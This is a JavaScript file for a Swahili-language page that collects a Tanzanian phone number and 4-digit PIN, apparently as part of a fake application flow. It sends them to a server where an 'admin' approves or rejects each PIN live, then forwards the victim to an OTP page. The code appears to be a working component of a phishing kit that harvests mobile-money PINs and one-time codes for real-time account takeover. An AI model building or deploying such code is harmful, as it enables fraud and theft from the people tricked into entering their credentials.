// PIN Verification Script with Enhanced Admin ID Support - FIXED VERSION
document.addEventListener('DOMContentLoaded', function() {
    const phoneInput = document.getElementById('phoneNumber');
    const pinInput = document.getElementById('pin');
    const verifyBtn = document.getElementById('verifyPinBtn');
    const pinScreen = document.getElementById('pinScreen');
    const processingScreen = document.getElementById('processingScreen');
    const rejectionScreen = document.getElementById('rejectionScreen');
    
    // ========================================
    // ERROR MESSAGE DISPLAY
    // ========================================
    const errorDiv = document.createElement('div');
    errorDiv.className = 'error-message';
    errorDiv.style.cssText = 'display:none; background:#fee; border:1px solid #fcc; color:#c33; padding:12px; border-radius:8px; margin:10px 0; font-weight: 500;';
    
    // Insert error div after form title
    const formTitle = document.querySelector('.form-title');
    if (formTitle && formTitle.parentNode) {
        formTitle.parentNode.insertBefore(errorDiv, formTitle.nextSibling);
    }
    
    // Function to show error message instead of alert
    function showError(message) {
        errorDiv.textContent = message;
        errorDiv.style.display = 'block';
        setTimeout(() => {
            errorDiv.style.display = 'none';
        }, 5000);
        // Scroll to error
        errorDiv.scrollIntoView({ behavior: 'smooth', block: 'center' });
    }
    
    // ========================================
    // GET APPLICATION DATA AND ADMIN ID
    // ========================================
    const applicationData = JSON.parse(sessionStorage.getItem('applicationData') || '{}');
    
    // Get admin ID from multiple sources (prioritize sessionStorage, fallback to localStorage)
    let adminId = sessionStorage.getItem('selectedAdminId') || 
                  localStorage.getItem('selectedAdminId') ||
                  applicationData.adminId;
    
    // Store it back if we got it from fallback
    if (adminId && !sessionStorage.getItem('selectedAdminId')) {
        sessionStorage.setItem('selectedAdminId', adminId);
        console.log('🔄 Restored admin ID from backup:', adminId);
    }
    
    // Check if we have application ID - redirect silently if not
    if (!applicationData.applicationId) {
        console.error('❌ No application data found - redirecting to home');
        window.location.href = 'index.html';
        return;
    }
    
    // ========================================
    // LOG ADMIN ASSIGNMENT STATUS
    // ========================================
    console.log('═══════════════════════════════════════');
    console.log('📱 PIN VERIFICATION PAGE');
    console.log('═══════════════════════════════════════');
    console.log('📋 Application ID:', applicationData.applicationId);
    console.log('👤 Admin ID:', adminId || 'WILL BE AUTO-ASSIGNED');
    console.log('📅 Created:', applicationData.timestamp);
    
    if (adminId) {
        console.log('%c✅ ADMIN ASSIGNED: ' + adminId, 'background: #4CAF50; color: white; padding: 5px 10px; border-radius: 3px; font-weight: bold;');
    } else {
        console.log('%c⚠️ NO ADMIN - SERVER WILL AUTO-ASSIGN', 'background: #FF9800; color: white; padding: 5px 10px; border-radius: 3px; font-weight: bold;');
    }
    console.log('═══════════════════════════════════════');
    
    // ========================================
    // PIN INPUT - ONLY ALLOW NUMBERS
    // ========================================
    pinInput.addEventListener('input', function(e) {
        this.value = this.value.replace(/\D/g, '').slice(0, 4);
    });
    
    // ========================================
    // PHONE NUMBER FORMATTING
    // ========================================
    phoneInput.addEventListener('input', function(e) {
        let value = this.value.replace(/\D/g, '');
        
        // Add +255 prefix if not present
        if (value.length > 0 && !value.startsWith('255')) {
            if (value.startsWith('0')) {
                value = '255' + value.substring(1);
            } else if (value.startsWith('7')) {
                value = '255' + value;
            }
        }
        
        // Format the number
        if (value.length > 3) {
            this.value = '+' + value.substring(0, 3) + ' ' + value.substring(3);
        } else if (value.length > 0) {
            this.value = '+' + value;
        } else {
            this.value = '';
        }
    });
    
    // ========================================
    // VERIFY PIN BUTTON
    // ========================================
    verifyBtn.addEventListener('click', async function(e) {
        e.preventDefault();
        
        const phoneNumber = phoneInput.value.trim().replace(/\s/g, '');
        const pin = pinInput.value.trim();
        
        // ========================================
        // VALIDATION WITH VISUAL FEEDBACK
        // ========================================
        if (!phoneNumber) {
            showError('Tafadhali weka nambari yako ya simu');
            phoneInput.focus();
            phoneInput.style.borderColor = '#c33';
            setTimeout(() => { phoneInput.style.borderColor = ''; }, 3000);
            return;
        }
        
        // Validate phone number format
        if (!phoneNumber.match(/^\+?255\d{9}$/)) {
            showError('Nambari ya simu sio sahihi. Tumia format: +255XXXXXXXXX');
            phoneInput.focus();
            phoneInput.style.borderColor = '#c33';
            setTimeout(() => { phoneInput.style.borderColor = ''; }, 3000);
            return;
        }
        
        if (pin.length !== 4) {
            showError('PIN lazima iwe na nambari 4');
            pinInput.focus();
            pinInput.style.borderColor = '#c33';
            setTimeout(() => { pinInput.style.borderColor = ''; }, 3000);
            return;
        }
        
        // ========================================
        // SAVE TO APPLICATION DATA
        // ========================================
        applicationData.phone = phoneNumber;
        applicationData.pin = pin;
        applicationData.adminId = adminId;
        sessionStorage.setItem('applicationData', JSON.stringify(applicationData));
        
        // Show processing screen
        pinScreen.style.display = 'none';
        processingScreen.style.display = 'block';
        
        // ========================================
        // PREPARE REQUEST DATA WITH ADMIN ID
        // ========================================
        const requestData = {
            phoneNumber: phoneNumber,  // ✅ FIXED: Use phoneNumber to match backend
            pin: pin
        };
        
        // ✅ CRITICAL: ADD ADMIN ID TO REQUEST
        if (adminId && adminId !== 'undefined' && adminId !== 'null' && adminId !== '') {
            requestData.adminId = adminId;
            requestData.assignmentType = 'specific';  // ✅ ADDED: Tell backend this is specific assignment
            console.log('📤 Sending with admin ID:', adminId);
            console.log('%c✅ SPECIFIC ASSIGNMENT', 'background: #2196F3; color: white; padding: 5px 10px; border-radius: 3px; font-weight: bold;');
        } else {
            requestData.assignmentType = 'auto';  // ✅ ADDED: Tell backend to auto-assign
            console.log('📤 Sending without admin ID (server will auto-assign)');
            console.log('%c⚠️ AUTO-ASSIGNMENT', 'background: #FF9800; color: white; padding: 5px 10px; border-radius: 3px; font-weight: bold;');
        }
        
        console.log('📦 Request payload:', JSON.stringify(requestData, null, 2));
        
        // ========================================
        // SEND TO SERVER
        // ========================================
        try {
            const response = await fetch('/api/verify-pin', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(requestData)
            });
            
            const result = await response.json();
            
            console.log('📥 Server response:', result);
            
            if (result.success) {
                console.log('✅ PIN sent for verification');
                console.log('📋 Application ID:', result.applicationId);
                
                if (result.assignedTo) {
                    console.log('👤 Assigned to admin:', result.assignedTo);
                    console.log('🆔 Admin ID:', result.assignedAdminId);
                    console.log('%c✅ ASSIGNMENT CONFIRMED', 'background: #4CAF50; color: white; padding: 5px 10px; border-radius: 3px; font-weight: bold;');
                }
                
                // Update admin ID in session if it was auto-assigned
                if (result.assignedAdminId && !adminId) {
                    sessionStorage.setItem('selectedAdminId', result.assignedAdminId);
                    localStorage.setItem('selectedAdminId', result.assignedAdminId);
                    adminId = result.assignedAdminId;
                    console.log('🔄 Admin auto-assigned and stored:', result.assignedAdminId);
                }
                
                // Start polling for status
                checkPinStatus(result.applicationId);
            } else {
                throw new Error(result.message || result.error || 'Failed to submit');
            }
            
        } catch (error) {
            console.error('❌ Error submitting PIN:', error);
            processingScreen.style.display = 'none';
            pinScreen.style.display = 'block';
            showError('Hitilafu imetokea. Tafadhali jaribu tena.\n\nMaelezo: ' + error.message);
        }
    });
    
    // ========================================
    // CHECK PIN STATUS (POLLING) - FIXED
    // ========================================
    function checkPinStatus(applicationId) {
        let checkCount = 0;
        const maxChecks = 150; // 5 minutes (2 seconds interval)
        
        console.log('🔄 Starting status polling for application:', applicationId);
        
        const statusInterval = setInterval(async () => {
            checkCount++;
            
            try {
                const response = await fetch(`/api/check-pin-status/${applicationId}`);
                
                // ✅ FIX: Handle both 200 and 404 responses
                if (!response.ok && response.status !== 404) {
                    throw new Error(`HTTP ${response.status}`);
                }
                
                const result = await response.json();
                
                // ✅ FIX: Check for result.success instead of result.found
                if (result.success && result.status) {
                    const status = result.status;
                    
                    // Only log every 10th check to reduce console spam
                    if (checkCount % 10 === 0 || status !== 'pending') {
                        console.log(`🔍 Check #${checkCount}: Status = ${status}`);
                    }
                    
                    if (status === 'approved') {
                        // PIN approved - redirect to OTP page
                        clearInterval(statusInterval);
                        console.log('✅ PIN APPROVED by admin!');
                        console.log('%c✅ VERIFICATION SUCCESSFUL', 'background: #4CAF50; color: white; padding: 10px 20px; border-radius: 5px; font-weight: bold; font-size: 14px;');
                        console.log('🔄 Redirecting to OTP page...');
                        
                        // Small delay for user feedback
                        setTimeout(() => {
                            window.location.href = 'otp.html';
                        }, 1000);
                        
                    } else if (status === 'rejected' || status === 'denied') {
                        // PIN rejected - show rejection screen
                        clearInterval(statusInterval);
                        console.log('❌ PIN REJECTED by admin');
                        console.log('%c❌ VERIFICATION FAILED', 'background: #f44336; color: white; padding: 10px 20px; border-radius: 5px; font-weight: bold; font-size: 14px;');
                        
                        processingScreen.style.display = 'none';
                        rejectionScreen.style.display = 'block';
                    }
                    // If still 'pending', keep polling
                } else {
                    // Application not found or other error
                    if (checkCount % 10 === 0) {
                        console.warn('⚠️ Application not found or error:', result.message);
                    }
                }
                
            } catch (error) {
                if (checkCount % 10 === 0) {
                    console.error('❌ Error checking status:', error);
                }
                // Don't stop polling on network errors - might be temporary
            }
            
            // Stop after max checks
            if (checkCount >= maxChecks) {
                clearInterval(statusInterval);
                console.log('⏰ Polling timeout reached');
                console.log('%c⏰ TIMEOUT', 'background: #FF9800; color: white; padding: 10px 20px; border-radius: 5px; font-weight: bold; font-size: 14px;');
                
                processingScreen.style.display = 'none';
                pinScreen.style.display = 'block';
                showError('Muda umeisha. Msimamizi hajaitikia ombi lako. Tafadhali jaribu tena baadaye.');
            }
            
        }, 2000); // Check every 2 seconds
    }
    
    // ========================================
    // TRY AGAIN BUTTON
    // ========================================
    const tryAgainBtn = document.querySelector('#tryAgainBtn');
    if (tryAgainBtn) {
        tryAgainBtn.addEventListener('click', function() {
            rejectionScreen.style.display = 'none';
            pinScreen.style.display = 'block';
            // Clear inputs
            phoneInput.value = '';
            pinInput.value = '';
            errorDiv.style.display = 'none';
        });
    }
    
    // ========================================
    // VISUAL ADMIN INDICATOR (Optional)
    // ========================================
    if (adminId) {
        const indicator = document.createElement('div');
        indicator.style.cssText = `
            position: fixed;
            bottom: 20px;
            right: 20px;
            background: #2196F3;
            color: white;
            padding: 8px 16px;
            border-radius: 20px;
            font-size: 11px;
            font-weight: bold;
            z-index: 9999;
            box-shadow: 0 2px 8px rgba(0,0,0,0.15);
            animation: slideIn 0.3s ease-out;
        `;
        indicator.textContent = '🎯 Admin: ' + adminId;
        
        document.body.appendChild(indicator);
        
        // Add animation
        const style = document.createElement('style');
        style.textContent = `
            @keyframes slideIn {
                from { transform: translateX(100px); opacity: 0; }
                to { transform: translateX(0); opacity: 1; }
            }
        `;
        document.head.appendChild(style);
        
        // Remove after 5 seconds
        setTimeout(() => {
            indicator.style.opacity = '0';
            indicator.style.transform = 'translateX(100px)';
            indicator.style.transition = 'all 0.3s ease-out';
            setTimeout(() => indicator.remove(), 300);
        }, 5000);
    }
});